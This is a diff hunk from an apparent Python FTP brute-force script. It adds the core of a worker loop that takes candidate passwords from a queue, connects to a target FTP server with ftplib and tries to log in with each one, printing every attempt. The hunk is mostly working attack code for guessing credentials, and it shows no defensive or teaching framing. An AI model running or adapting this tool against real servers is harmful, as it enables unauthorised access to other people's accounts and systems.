@@ -69,3 +69,11 @@ def connect_ftp():
     while True:
         # get the password from the queue
         password = q.get()
+        # initialize the FTP server object
+        server = ftplib.FTP()
+        print("[!] Trying", password)
+        try:
+            # tries to connect to FTP server with a timeout of 5
+            server.connect(host, port, timeout=5)
+            # login using the credentials (user & password)
+            server.login(user, password)
